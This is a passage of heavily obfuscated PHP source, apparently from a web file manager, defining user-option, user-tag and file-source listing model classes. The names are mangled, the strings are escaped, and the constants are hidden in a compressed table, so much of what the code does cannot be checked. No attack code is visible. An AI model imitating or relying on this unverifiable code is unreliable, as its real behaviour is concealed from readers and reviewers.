$this->cacheTime; return $this->handle->set($´¾˜êŞ, $Éá”ÑÍä, $ó´ÌˆË); } public function get($¼°Î–ˆ›) { return $this->handle->get($¼°Î–ˆ›); } public function remove($Ñ’€œ«) { return $this->handle->delete($Ñ’€œ«); } public function deleteAll() { return $this->handle->flush(); } } goto d”æÄèĞ¤—; aæ‚„ÆÒæÍ: define($_SERVER[áäÒ½¯Ç][0], $_SERVER[áäÒ½¯Ç][1]); $_SERVER[Ş¤Ÿ¢à¹] = explode($_SERVER[áäÒ½¯Ç][2], gzinflate(substr($_SERVER[áäÒ½¯Ç][3], 10, -8))); function binCheckEq($Ì‘üÔª, $İÜ›ë’) { return $Ì‘üÔª == $İÜ›ë’; } goto CñĞÕ‰Ÿêß; DŞŠ±‹Ü¬è: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\x5f\x6f\x70\x74\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ üƒÅ) { return "\x55\x73\x65\x72\x4f\x70\164\151\x6f\156\x5f{$ üƒÅ}\x5f" . KodUser::id(); } protected function filterWhere($ş“¦—€) { $ş“¦—€[$_SERVER[áäÒ½¯Ç][1542]] = KodUser::id(); return $ş“¦—€; } public function cacheRemoveUser($¬÷Û„£ñ, $±ıÖ€×É) { return Cache::remove("\x55\x73\x65\162\117\160\164\151\x6f\156\x5f{$¬÷Û„£ñ}\137" . $±ıÖ€×É); } protected function optionDefault($ëé—ñ‰ë = '') { $¡À«Ã¢ =& $_SERVER[áäÒ½¯Ç]; if ($ëé—ñ‰ë == $¡À«Ã¢[12]) { return $GLOBALS[$¡À«Ã¢[6]][$¡À«Ã¢[2673]]; } if ($ëé—ñ‰ë == $¡À«Ã¢[2674]) { return $GLOBALS[$¡À«Ã¢[6]][$¡À«Ã¢[2675]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\x2e\164\141\x67\114\151\163\x74"; public $modelType = "\125\x73\145\162\117\x70\164\151\157\x6e"; public $field = array("\x6e\141\155\x65", "\163\164\x79\154\145", "\x73\x6f\162\x74"); public function listData($Û‰Ü©’Ö = false, $½ÊÜ†®’ = "\x73\x6f\x72\x74", $ÚŞÒ² = false) { return parent::listData($Û‰Ü©’Ö, $½ÊÜ†®’, $ÚŞÒ²); } public function remove($ÅŞ¦§½) { return parent::remove($ÅŞ¦§½); } public function add($‰ô“ÀïË, $šÈà”—¢ = "\x6c\141\x62\x65\x6c\55\x67\162\145\171\55\x6e\157\x72\155\141\154") { $ïòæü»« =& $_SERVER[áäÒ½¯Ç]; if ($this->findByName($‰ô“ÀïË)) { return !1; } $À¬á¼› = array($ïòæü»«[514] => $‰ô“ÀïË, $ïòæü»«[579] => $šÈà”—¢, $ïòæü»«[2137] => $this->getSort($ïòæü»«[345]) + 1); return parent::insert($À¬á¼›); } public function update($îÜ©ÉŠ, $ëË¢Û¨£) { $ÒõÊ¾Â =& $_SERVER[áäÒ½¯Ç]; $¥Õ³øê = $this->listData($îÜ©ÉŠ); $Øñ¬ò¾± = $this->findByName($ëË¢Û¨£[$ÒõÊ¾Â[32]]); if (!$¥Õ³øê || $Øñ¬ò¾± && $Øñ¬ò¾±[$ÒõÊ¾Â[492]] != $¥Õ³øê[$ÒõÊ¾Â[492]]) { return !1; } return parent::update($îÜ©ÉŠ, $ëË¢Û¨£); } public function moveTop($øÍî…öè) { $„ƒÛº£Ä =& $_SERVER[áäÒ½¯Ç]; $¢ÍÒï²„ = parent::listData(); $ÑÑ“ÔƒÔ = $this->getSort($„ƒÛº£Ä[344]); foreach ($¢ÍÒï²„ as &$Á‡½¦ø) { if ($Á‡½¦ø[$„ƒÛº£Ä[492]] == $øÍî…öè) { $Á‡½¦ø[$„ƒÛº£Ä[2155]] = $ÑÑ“ÔƒÔ; continue; } $Á‡½¦ø[$„ƒÛº£Ä[2155]] += 1; } unset($Á‡½¦ø); return parent::resetData($¢ÍÒï²„); } public function moveBottom($–ÊÄÄ•) { $µ±ªÛÃ =& $_SERVER[áäÒ½¯Ç]; $ğÖÙŞ€¾ = $this->getSort($µ±ªÛÃ[345]) + 1; return parent::update($–ÊÄÄ•, array($µ±ªÛÃ[2155] => $ğÖÙŞ€¾)); } public function resetSort($ˆ—µù™Ì) { $ê»Ç¹íÉ =& $_SERVER[áäÒ½¯Ç]; $’ñŞõˆØ = array(); $ˆ—µù™Ì = is_array($ˆ—µù™Ì) ? $ˆ—µù™Ì : array(); for ($Ã¡Üˆ = 0; $Ã¡Üˆ < count($ˆ—µù™Ì); $Ã¡Üˆ++) { $’ñŞõˆØ[$ˆ—µù™Ì[$Ã¡Üˆ] . $ê»Ç¹íÉ[12]] = $Ã¡Üˆ + 1; } $ÖéÍ¬à = parent::listData(); foreach ($ÖéÍ¬à as &$öœŞËÀ) { $ôñÕ¤Ş® = $’ñŞõˆØ[$öœŞËÀ[$ê»Ç¹íÉ[492]]]; $öœŞËÀ[$ê»Ç¹íÉ[2155]] = $ôñÕ¤Ş® ? $ôñÕ¤Ş® : $öœŞËÀ[$ê»Ç¹íÉ[2155]]; } unset($öœŞËÀ); return parent::resetData($ÖéÍ¬à); } private function getSort($€¢Ï€ïÕ) { $Ôò¨ « =& $_SERVER[áäÒ½¯Ç]; $ğ€ÆÙ˜® = parent::listData(); $“ÊÇ·‘‹ = array_to_keyvalue($ğ€ÆÙ˜®, $Ôò¨ «[12], $Ôò¨ «[2155]); if (!$“ÊÇ·‘‹) { $“ÊÇ·‘‹ = array(0); } $–€úüöã = $€¢Ï€ïÕ == $Ôò¨ «[345] ? max($“ÊÇ·‘‹) : min($“ÊÇ·‘‹); return intval($–€úüöã); } } goto Aã–‘Ñ‘¤Ÿ; D©ïóóõï: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\x74\145\x6d\x4f\x70\164\151\x6f\156"; public $field = array(); public function listData($¢…ûûÚØ = false, $“ŸÕÎ‡ = "\155\157\144\x69\146\x79\124\151\155\145", $·¾µºÛ = false) { $¼÷Ş‰œğ =& $_SERVER[áäÒ½¯Ç]; $òèÆÎ­³ = Model($this->modelType)->get(!1, $this->optionType, !0); $ÏÚÎ÷Ş² = array_values($òèÆÎ­³); if ($ÏÚÎ÷Ş² && $ÏÚÎ÷Ş²[0] && !is_array($ÏÚÎ÷Ş²[0])) { Model($this->modelType)->cacheRemove($this->optionType); $òèÆÎ­³ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$òèÆÎ­³) { return $¢…ûûÚØ ? null : array(); } if (!$¢…ûûÚØ && $¢…ûûÚØ !== $¼÷Ş‰œğ[239]) { $òèÆÎ­³ = array_filter(array_values($òèÆÎ­³)); return array_sort_by($òèÆÎ­³, $“ŸÕÎ‡, $·¾µºÛ, $¼÷Ş‰œğ[492]); } return $òèÆÎ­³[$¼÷Ş‰œğ[493] . $¢…ûûÚØ]; } public function insert($ßûèŠ) { $ïğÆëÑ¯ =& $_SERVER[áäÒ½¯Ç]; $ßûèŠ = array_field_key($ßûèŠ, $this->field); $‡ê ˜„ = Model($this->modelType)->get($ïğÆëÑ¯[494], $this->optionType . $ïğÆëÑ¯[495]); $‡ê ˜„ = $‡ê ˜„ ? $‡ê ˜„ : 0; $ßûèŠ[$ïğÆëÑ¯[492]] = ++$‡ê ˜„; $ßûèŠ[$ïğÆëÑ¯[242]] = time(); $ßûèŠ[$ïğÆëÑ¯[88]] = time(); Model($this->modelType)->set($ïğÆëÑ¯[494], $‡ê ˜„, $this->optionType . $ïğÆëÑ¯[495]); Model($this->modelType)->set($ïğÆëÑ¯[493] . $‡ê ˜„, $ßûèŠ, $this->optionType); return $‡ê ˜„; } public function insertArr($´…ÅŸéÊ) { $—Ú”ë„½ =& $_SERVER[áäÒ½¯Ç]; if (!$´…ÅŸéÊ || !is_array($´…ÅŸéÊ)) { return !1; } $äê€¡Ä = Model($this->modelType)->get($—Ú”ë„½[494], $this->optionType . $—Ú”ë„½[495]); $äê€¡Ä = $äê€¡Ä ? $äê€¡Ä : 0; $ÇÌÖ€ú½ = array(); foreach ($´…ÅŸéÊ as $²èü—») { $‹½¡Ãàƒ = array_field_key($²èü—», $this->field); $‹½¡Ãàƒ[$—Ú”ë„½[492]] = ++$äê€¡Ä; $‹½¡Ãàƒ[$—Ú”ë„½[242]] = time(); $‹½¡Ãàƒ[$—Ú”ë„½[88]] = time(); $ÇÌÖ€ú½[$—Ú”ë„½[493] . $äê€¡Ä] = $‹½¡Ãàƒ; } Model($this->modelType)->set($—Ú”ë„½[494], $äê€¡Ä, $this->optionType . $—Ú”ë„½[495]); Model($this->modelType)->set($ÇÌÖ€ú½, !1, $this->optionType); return $äê€¡Ä; } public function update($“—ßÊ¤, $¤ÓÕ²’”) { $º˜àÌ†å =& $_SERVER[áäÒ½¯Ç]; $¤ÓÕ²’” = array_field_key($¤ÓÕ²’”, $this->field); $Â°Ñ—·û = $this->listData($“—ßÊ¤); if (!$Â°Ñ—·û || !$“—ßÊ¤) { return !1; } $¤ÓÕ²’” = array_merge($Â°Ñ—·û, $¤ÓÕ²’”); $¤ÓÕ²’”[$º˜àÌ†å[88]] = time(); return Model($this->modelType)->set($º˜àÌ†å[493] . $“—ßÊ¤, $¤ÓÕ²’”, $this->optionType); } public function remove($©ÁË§°ß) { if (!$©ÁË§°ß) { return !1; } return Model($this->modelType)->remove($_SERVER[áäÒ½¯Ç][493] . $©ÁË§°ß, $this->optionType); } public function removeArr($Ì®Øş­¸) { if (!$Ì®Øş­¸) { return !0; } $ò¦‹·²ş = array(); foreach ($Ì®Øş­¸ as $˜¨İ«°) { $ò¦‹·²ş[] = $_SERVER[áäÒ½¯Ç][493] . $˜¨İ«°; } return Model($this->modelType)->removeArr($ò¦‹·²ş, $this->optionType); } public function clear() { $Å­Ã¶ ë =& $_SERVER[áäÒ½¯Ç]; Model($this->modelType)->remove($Å­Ã¶ ë[494], $this->optionType . $Å­Ã¶ ë[495]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ÛËÛ¥¬©, $¿ûñ¾ä) { if (!$¿ûñ¾ä) { return !1; } $ÂÈ—ª®š = $this->listData(); $ÂÈ—ª®š = array_to_keyvalue($ÂÈ—ª®š, $ÛËÛ¥¬©); return isset($ÂÈ—ª®š[$¿ûñ¾ä]) ? $ÂÈ—ª®š[$¿ûñ¾ä] : !1; } public function findByName($³ÆÚŸÅ‰) { return $this->findByKey($_SERVER[áäÒ½¯Ç][32], $³ÆÚŸÅ‰); } protected function resetData($Ÿ©Ä«È½) { $É˜¬½„» =& $_SERVER[áäÒ½¯Ç]; if (!$Ÿ©Ä«È½) { return; } $Ÿ©Ä«È½ = is_array($Ÿ©Ä«È½) ? $Ÿ©Ä«È½ : array(); $¯ì™¹· = array(); for ($Œëô×Ó… = 0; $Œëô×Ó… < count($Ÿ©Ä«È½); $Œëô×Ó…++) { if (!$Ÿ©Ä«È½[$Œëô×Ó…] || !$Ÿ©Ä«È½[$Œëô×Ó…][$É˜¬½„»[492]]) { continue; } $¯ì™¹·[$É˜¬½„»[493] . $Ÿ©Ä«È½[$Œëô×Ó…][$É˜¬½„»[492]]] = $Ÿ©Ä«È½[$Œëô×Ó…]; } return Model($this->modelType)->set($¯ì™¹·, !1, $this->optionType); } private function getAutoName($î˜Ü°) { $ëÎ¤×È‚ = array_to_keyvalue($this->listData(), $_SERVER[áäÒ½¯Ç][32]); if (!$ëÎ¤×È‚ || !isset($ëÎ¤×È‚[$î˜Ü°])) { return $î˜Ü°; } for ($„º­ÍšÕ = 1; $„º­ÍšÕ < count($ëÎ¤×È‚); $„º­ÍšÕ++) { $ñƒŸªîÉ = $î˜Ü° . "\50{$„º­ÍšÕ}\x29"; if (!isset($ëÎ¤×È‚[$ñƒŸªîÉ])) { return $ñƒŸªîÉ; } } return $ñƒŸªîÉ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($áŸ…İŒë = false, $ñÛ³Œ · = '', $Ù×å‚øš = false, $ø°¾¢Úï = true) { $Ş³üêÖ¤ =& $_SERVER[áäÒ½¯Ç]; $—ôß–Å = $this->cacheGet($ñÛ³Œ ·); $ÃÑù„ºÚ = $this->optionDefault($ñÛ³Œ ·); $ÃÑù„ºÚ = is_array($ÃÑù„ºÚ) ? $ÃÑù„ºÚ : array(); if (is_array($—ôß–Å)) { if ($ø°¾¢Úï) { $—ôß–Å = array_merge($ÃÑù„ºÚ, $—ôß–Å); } return $áŸ…İŒë ? isset($—ôß–Å[$áŸ…İŒë]) ? $—ôß–Å[$áŸ…İŒë] : null : $—ôß–Å; } $¤äê½ÆÄ = $this->filterWhere(array($Ş³üêÖ¤[33] => $ñÛ³Œ ·)); $—ôß–Å = $this->where($¤äê½ÆÄ)->select(); $—ôß–Å = array_to_keyvalue($—ôß–Å, $Ş³üêÖ¤[95], $Ş³üêÖ¤[460]); foreach ($—ôß–Å as $±˜ñøŒÏ => $ü÷„ÃıÔ) { if ($Ù×å‚øš || in_array($±˜ñøŒÏ, $this->jsonField)) { $—ôß–Å[$±˜ñøŒÏ] = json_decode($ü÷„ÃıÔ, !0); } } $this->cacheSet($ñÛ³Œ ·, $—ôß–Å); if ($ø°¾¢Úï) { $—ôß–Å = array_merge($ÃÑù„ºÚ, $—ôß–Å); } return $áŸ…İŒë ? $—ôß–Å[$áŸ…İŒë] : $—ôß–Å; } public function set($¡µÎâ¤Ÿ, $¯æÊôº  = false, $Ş·“âãœ = '') { $Ì€¥¤¦ =& $_SERVER[áäÒ½¯Ç]; if (!$¡µÎâ¤Ÿ) { return !0; } $åë‚ŠŞ = $this->get(!1, $Ş·“âãœ, !1, !1); $åë‚ŠŞ = is_array($åë‚ŠŞ) ? $åë‚ŠŞ : array(); $ÄÓêÖì = array(); $Ä›·í¶Æ = array(); $¥•ö”ù = array(); $¥ëéúÀó = is_array($¡µÎâ¤Ÿ) ? $¡µÎâ¤Ÿ : array($¡µÎâ¤Ÿ => $¯æÊôº ); $€¶â–ŸÁ = $this->filterWhere(array($Ì€¥¤¦[33] => $Ş·“âãœ)); foreach ($¥ëéúÀó as $ëîƒ§²³ => $øôæÙ‰È) { if (is_array($øôæÙ‰È)) { $øôæÙ‰È = json_encode_force($øôæÙ‰È); } $this->checkLength($øôæÙ‰È, !1, $this->tableName . $Ì€¥¤¦[4] . $¡µÎâ¤Ÿ); $øôæÙ‰È = self::textEncode($øôæÙ‰È); if (array_key_exists($ëîƒ§²³, $åë‚ŠŞ)) { $Ùğúı÷ = is_array($åë‚ŠŞ[$ëîƒ§²³]) ? json_encode_force($åë‚ŠŞ[$ëîƒ§²³]) : $åë‚ŠŞ[$ëîƒ§²³]; $Ùğúı÷ = self::textEncode($Ùğúı÷); if ($Ùğúı÷ === $øôæÙ‰È) { continue; } $Ä›·í¶Æ[] = array($Ì€¥¤¦[95], $ëîƒ§²³, $Ì€¥¤¦[460], $øôæÙ‰È, $Ì€¥¤¦[88], time()); } else { $Úæ–ÙÄš = array($Ì€¥¤¦[33] => $Ş·“âãœ, $Ì€¥¤¦[95] => $ëîƒ§²³, $Ì€¥¤¦[460] => $øôæÙ‰È); $ÄÓêÖì[] = $this->filterWhere($Úæ–ÙÄš); } } if (!$ÄÓêÖì && !$Ä›·í¶Æ) { return !0; } $this->cacheRemove($Ş·“âãœ); $µ´ì¸ıØ = $this->cacheKey($Ì€¥¤¦[496]); CacheLock::lock($µ´ì¸ıØ); if ($ÄÓêÖì) { $this->addAll($ÄÓêÖì); } if ($Ä›·í¶Æ) { $this->saveAll($Ä›·í¶Æ, $€¶â–ŸÁ); } CacheLock::unlock($µ´ì¸ıØ); return !0; } protected function optionDefault($ß´‡µô¹ = '') { return !1; } public function setDeep($¦…ÉÄÈğ, $Î’µª¿ = false, $è«öáò¢ = '') { $ÛÇÙªé = explode($_SERVER[áäÒ½¯Ç][10], $¦…ÉÄÈğ); $‘··Õ­¯ = $this->get(); array_set_value($‘··Õ­¯, $¦…ÉÄÈğ, $Î’µª¿); $this->set($ÛÇÙªé[0], $‘··Õ­¯[$ÛÇÙªé[0]], $è«öáò¢); } public function remove($ƒÕŒ¢ğ, $”¾»À¨ = '') { $ÓÂÓÙÈù =& $_SERVER[áäÒ½¯Ç]; $this->cacheRemove($”¾»À¨); $•–Öáıª = $this->filterWhere(array($ÓÂÓÙÈù[95] => $ƒÕŒ¢ğ, $ÓÂÓÙÈù[33] => $”¾»À¨)); if (is_null($ƒÕŒ¢ğ)) { unset($•–Öáıª[$ÓÂÓÙÈù[95]]); } return $this->where($•–Öáıª)->delete(); } public function removeArr($ıİÀ¡Åö, $é»ôÏ•š = '') { $•¼ßŒñÔ =& $_SERVER[áäÒ½¯Ç]; if (!$ıİÀ¡Åö || !is_array($ıİÀ¡Åö)) { return !0; } $this->cacheRemove($é»ôÏ•š); $Õı§©’ = $this->filterWhere(array($•¼ßŒñÔ[33] => $é»ôÏ•š, $•¼ßŒñÔ[95] => array($•¼ßŒñÔ[7], $ıİÀ¡Åö))); return $this->where($Õı§©’)->delete(); } public function cacheSet($¢£®¤‘Ê, $¼“ÕÓÇ£ = false) { return Cache::set($this->cacheKey($¢£®¤‘Ê), $¼“ÕÓÇ£); } public function cacheGet($ÛØ”ÄšÙ) { return Cache::get($this->cacheKey($ÛØ”ÄšÙ)); } public function cacheRemove($ğÆåÒíü) { return Cache::remove($this->cacheKey($ğÆåÒíü)); } protected function filterWhere($Ûª¸Ü£) { return $Ûª¸Ü£; } protected function cacheKey($È«—¦¼È) { return $È«—¦¼È; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\x72\143\x65"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\141\155\145" => "\151\157\137\163\157\x75\162\143\145\x5f\155\x65\x74\141", "\x6d\145\x74\141\x46\x69\x65\x6c\x64" => "\x73\x6f\165\x72\x63\x65\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\151\146\171\124\151\x6d\145", "\164\151\155\145", "\x69\x6e\163\x65\162\164", "\146\x75\x6e\x63\x74\151\157\156"), array("\x63\162\145\x61\164\145\x54\151\x6d\x65", "\x74\x69\155\145", "\151\x6e\x73\145\x72\164", "\x66\165\156\143\164\151\157\156"), array("\x76\x69\145\167\124\151\155\x65", "\164\x69\x6d\x65", "\151\156\x73\145\x72\x74", "\x66\x75\156\x63\164\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ƒªª„³) { return $this->listSource(array($_SERVER[áäÒ½¯Ç][497] => $ƒªª„³)); } public function typeName($İÁàªé¤) { static $‰˜ƒ¡Î¶ = array(self::TYPE_SYSTEM => "\x73\x79\x73\x74\x65\155", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\147\162\x6f\x75\160"); return $‰˜ƒ¡Î¶[$İÁàªé¤ . $_SERVER[áäÒ½¯Ç][12]]; } public function sourceListInfo($†„ê©–…, $ÈèŸÑ£ = false) { $—ì±—®İ =& $_SERVER[áäÒ½¯Ç]; $†„ê©–… = $†„ê©–… ? $†„ê©–… : array(); $†„ê©–… = array_filter(array_unique($†„ê©–…)); if (!$†„ê©–…) { return array(); } $ÏŸÅê˜¥ = $this->where(array($—ì±—®İ[192] => array($—ì±—®İ[7], $†„ê©–…)))->select(); $this->_listDataApply($ÏŸÅê˜¥, $ÈèŸÑ£); return array_to_keyvalue($ÏŸÅê˜¥, $—ì±—®İ[192]); } public function pathInfoFilter(&$Ôş—Ã Ó) { $øÓÌØ¨ú =& $_SERVER[áäÒ½¯Ç]; static $ñùÕã½´ = false; static $ıŸ¶¿™• = false; static $óØğÓïî = false; if (!$ñùÕã½´) { $æ©Ú³—Í = $øÓÌØ¨ú[498]; $æ©Ú³—Í .= $øÓÌØ¨ú[499]; $æ©Ú³—Í .= $øÓÌØ¨ú[500]; $–ÒŞà „ = $øÓÌØ¨ú[501]; $›Çİù§ = explode($øÓÌØ¨ú[50], $–ÒŞà „); $ñùÕã½´ = explode($øÓÌØ¨ú[50], $æ©Ú³—Í); $ıŸ¶¿™• = array(); foreach ($ñùÕã½´ as $«õÛæ…ç) { if (in_array($«õÛæ…ç, $›Çİù§)) { continue; } $ıŸ¶¿™•[] = $«õÛæ…ç; } $óØğÓïî = explode($øÓÌØ¨ú[50], $øÓÌØ¨ú[502]); } foreach ($óØğÓïî as $ú¤õ«¯) { if (isset($Ôş—Ã Ó[$ú¤õ«¯])) { $Ôş—Ã Ó[$ú¤õ«¯] = intval($Ôş—Ã Ó[$ú¤õ«¯]); } } $Ôş—Ã Ó[$øÓÌØ¨ú[87]] = $øÓÌØ¨ú[503] . $Ôş—Ã Ó[$øÓÌØ¨ú[192]] . $øÓÌØ¨ú[504]; $Ôş—Ã Ó[$øÓÌØ¨ú[33]] = $Ôş—Ã Ó[$øÓÌØ¨ú[505]] == 1 ? $øÓÌØ¨ú[78] : $øÓÌØ¨ú[241]; $Ôş—Ã Ó[$øÓÌØ¨ú[189]] = $this->typeName($Ôş—Ã Ó[$øÓÌØ¨ú[189]]); if ($Ôş—Ã Ó[$øÓÌØ¨ú[505]] != 1) { $Ôş—Ã Ó[$øÓÌØ¨ú[167]] = $Ôş—Ã Ó[$øÓÌØ¨ú[506]]; unset($Ôş—Ã Ó[$øÓÌØ¨ú[506]]); } $Íëßá˜ = $ñùÕã½´; if (isset($Ôş—Ã Ó[$øÓÌØ¨ú[507]]) && $Ôş—Ã Ó[$øÓÌØ¨ú[507]][$øÓÌØ¨ú[508]] == -1) { $Íëßá˜ = $ıŸ¶¿™•; } $Ôş—Ã Ó = array_field_key($Ôş—Ã Ó, $Íëßá˜); return $Ôş—Ã Ó; } public function listUserFav() { $¶É€¿öË =& $_SERVER[áäÒ½¯Ç]; $„Í›Ç‘º = Model($¶É€¿öË[509])->listData(); $İüİşğş = array_filter_by_field($„Í›Ç‘º, $¶É€¿öË[33], $¶É€¿öË[510]); $İüİşğş = array_to_keyvalue($İüİşğş, $¶É€¿öË[12], $¶É€¿öË[87]); if ($İüİşğş) { $ÈË¼šı’ = $this->listSource(array($¶É€¿öË[511] => array($¶É€¿öË[512], $İüİşğş))); } $ÈË¼šı’ = array_to_keyvalue($ÈË¼šı’[$¶É€¿öË[455]], $¶É€¿öË[192]); foreach ($„Í›Ç‘º as &$––œÎÃş) { $––œÎÃş = array($¶É€¿öË[513] => $––œÎÃş[$¶É€¿öË[492]], $¶É€¿öË[514] => $––œÎÃş[$¶É€¿öË[32]], $¶É€¿öË[515] => $––œÎÃş[$¶É€¿öË[87]], $¶É€¿öË[516] => $––œÎÃş[$¶É€¿öË[33]], $¶É€¿öË[517] => $––œÎÃş[$¶É€¿öË[242]], $¶É€¿öË[518] => $––œÎÃş[$¶É€¿öË[88]]); if ($––œÎÃş[$¶É€¿öË[33]] == $¶É€¿öË[510] && $ÈË¼šı’[$––œÎÃş[$¶É€¿öË[87]]]) { $––œÎÃş[$¶É€¿öË[90]] = $ÈË¼šı’[$––œÎÃş[$¶É€¿öË[87]]]; } } unset($––œÎÃş); return $„Í›Ç‘º; } public function listUserTag($†¹Ğì£é) { $ÍıÍÖ½å =& $_SERVER[áäÒ½¯Ç]; if ($†¹Ğì£é && !is_array($†¹Ğì£é)) { $†¹Ğì£é = array($†¹Ğì£é); } $õ¥Òê›² = Model($ÍıÍÖ½å[519])->listData(); $†ç›Ë† = array(); $  ô°ê = array(); foreach ($õ¥Òê›² as $êÒ«å•´) { $Ì…à¢‰§ = $êÒ«å•´[$ÍıÍÖ½å[87]]; if (!$Ì…à¢‰§) { continue; } if (!isset($  ô°ê[$Ì…à¢‰§])) { $  ô°ê[$Ì…à¢‰§] = array(); } $  ô°ê[$Ì…à¢‰§][] = $êÒ«å•´[$ÍıÍÖ½å[520]]; $†ç›Ë†[$êÒ«å•´[$ÍıÍÖ½å[87]]] = $êÒ«å•´; } $·­øò¹ü = array(); $—²èËÖ„ = array(); $äÃİ—â = array(); foreach ($  ô°ê as $ƒ÷¬¹Éú => $ò›ÒÑÁ×) { $ö¹è²óÉ = !0; if (!$†¹Ğì£é) { $·­øò¹ü[] = $ƒ÷¬¹Éú; continue; } foreach ($†¹Ğì£é as $Í¨âß …) { if (!in_array($Í¨âß …, $ò›ÒÑÁ×)) { $ö¹è²óÉ = !1; break; } } if (!$ö¹è²óÉ) { continue; } if (!is_numeric($ƒ÷¬¹Éú)) { $×Îôş€ò = $†ç›Ë†[$ƒ÷¬¹Éú]; $²Îã¡­› = array($ÍıÍÖ½å[32] => $×Îôş€ò[$ÍıÍÖ½å[32]], $ÍıÍÖ½å[87] => $×Îôş€ò[$ÍıÍÖ½å[87]], $ÍıÍÖ½å[33] => $×Îôş€ò[$ÍıÍÖ½å[33]], $ÍıÍÖ½å[90] => array($ÍıÍÖ½å[521] => 1), $ÍıÍÖ½å[243] => !0); if ($×Îôş€ò[$ÍıÍÖ½å[33]] == $ÍıÍÖ½å[241]) { $äÃİ—â[] = $²Îã¡­›; } if ($×Îôş€ò[$ÍıÍÖ½å[33]] == $ÍıÍÖ½å[78]) { $—²èËÖ„[] = $²Îã¡­›; } continue; } $·­øò¹ü[] = $ƒ÷¬¹Éú; } if ($·­øò¹ü) { $Øµéô § = $this->listSource(array($ÍıÍÖ½å[511] => array($ÍıÍÖ½å[512], $·­øò¹ü))); } $Øµéô § = $Øµéô § ? $Øµéô § : array($ÍıÍÖ½å[85] => array(), $ÍıÍÖ½å[86] => array()); $Øµéô §[$ÍıÍÖ½å[85]] = array_merge($Øµéô §[$ÍıÍÖ½å[85]], $—²èËÖ„); $Øµéô §[$ÍıÍÖ½å[86]] = array_merge($Øµéô §[$ÍıÍÖ½å[86]], $äÃİ—â); if (isset($Øµéô §[$ÍıÍÖ½å[452]]) && count($·­øò¹ü) == $Øµéô §[$ÍıÍÖ½å[452]][$ÍıÍÖ½å[453]]) { return $Øµéô §; } $¼óÍê³à = array(); $˜­éäÅ = array_to_keyvalue($Øµéô §[$ÍıÍÖ½å[85]], $ÍıÍÖ½å[12], $ÍıÍÖ½å[192]); $·ğÆÔé = array_to_keyvalue($Øµéô §[$ÍıÍÖ½å[86]], $ÍıÍÖ½å[12], $ÍıÍÖ½å[192]); $Û«•Ğ×÷ = array_merge($·ğÆÔé, $˜­éäÅ); foreach ($·­øò¹ü as $Ì…à¢‰§) { if (!in_array($Ì…à¢‰§, $Û«•Ğ×÷)) { $¼óÍê³à[] = $Ì…à¢‰§; } } if ($¼óÍê³à) { Model($ÍıÍÖ½å[522])->removeBySource($¼óÍê³à); } return $Øµéô §; } public function listUserRecycle() { $áÄ÷ªÜ¤ =& $_SERVER[áäÒ½¯Ç]; $ë·¿©æ§ = Model($áÄ÷ªÜ¤[523])->listData(); if (!$ë·¿©æ§) { return array(); } $™°®×ë¹ = array($áÄ÷ªÜ¤[511] => array($áÄ÷ªÜ¤[512], $ë·¿©æ§), $áÄ÷ªÜ¤[524] => 1); return $this->listSource($™°®×ë¹); } public function listSource($ò²à…¬í, $¸üı™„ì = 3000, $‚£üŒÁÅ = false) { $²¥ÜÂù =& $_SERVER[áäÒ½¯Ç]; if (!isset($ò²à…¬í[$²¥ÜÂù[525]])) { $ò²à…¬í[$²¥ÜÂù[525]] = 0; } if (isset($ò²à…¬í[$²¥ÜÂù[191]]) && $ò²à…¬í[$²¥ÜÂù[191]] == $²¥ÜÂù[239]) { $ò²à…¬í[$²¥ÜÂù[506]] = array($²¥ÜÂù[473], $²¥ÜÂù[12]); } if (isset($ò²à…¬í[$²¥ÜÂù[191]])) { $ò²à…¬í[$²¥ÜÂù[191]] = intval($ò²à…¬í[$²¥ÜÂù[191]]); } $  ‘Å = $²¥ÜÂù[526]; $’ËÒ¹Ğæ = $this->field($  ‘Å)->_makeOrder()->where($ò²à…¬í)->selectPage($¸üı™„ì); $this->_listPageCheck($’ËÒ¹Ğæ, $  ‘Å, $ò²à…¬í); $this->_listDataApply($’ËÒ¹Ğæ[$²¥ÜÂù[455]], $‚£üŒÁÅ); $this->_listMake($’ËÒ¹Ğæ); return $’ËÒ¹Ğæ; } private function _listPageCheck(&$ŠÕÁØ¢, $ŞöÑ™Ÿ÷, $ò…¹•€) { $¬üòì =& $_SERVER[áäÒ½¯Ç]; if (!is_array($ŠÕÁØ¢[$¬üòì[452]])) { return; } $×¢ÓÉĞ¸ = $ŠÕÁØ¢[$¬üòì[452]]; if ($×¢ÓÉĞ¸[$¬üòì[454]] <= 1) { return; } if ($×¢ÓÉĞ¸[$¬üòì[453]] >= 100000) { return; } if (Model($¬üòì[527])->get($¬üòì[528]) != $¬üòì[529]) { return; } $ŞöÑ™Ÿ÷ = str_replace(array($¬üòì[53], $¬üòì[427], $¬üòì[221]), $¬üòì[12], $ŞöÑ™Ÿ÷); $ŞöÑ™Ÿ÷ = $¬üòì[530] . str_replace($¬üòì[50], $¬üòì[531], $ŞöÑ™Ÿ÷) . $¬üòì[532]; $¢®Éİß = $¬üòì[533]; $¢®Éİß = $¢®Éİß . $¬üòì[534]; $ßƒÎ¶¤ = $×¢ÓÉĞ¸[$¬üòì[449]] * ($×¢ÓÉĞ¸[$¬üòì[438]] - 1) . $¬üòì[50] . $×¢ÓÉĞ¸[$¬üòì[449]]; $èïéƒ˜Š = $this->_makeOrder(!0); $ñÔ¼î˜ò = $¬üòì[530] . str_replace($¬üòì[50], $¬üòì[531], $èïéƒ˜Š[0]); if (strpos($ñÔ¼î˜ò, $¬üòì[535])) { $ñÔ¼î˜ò = str_replace($¬üòì[535], $¬üòì[536], 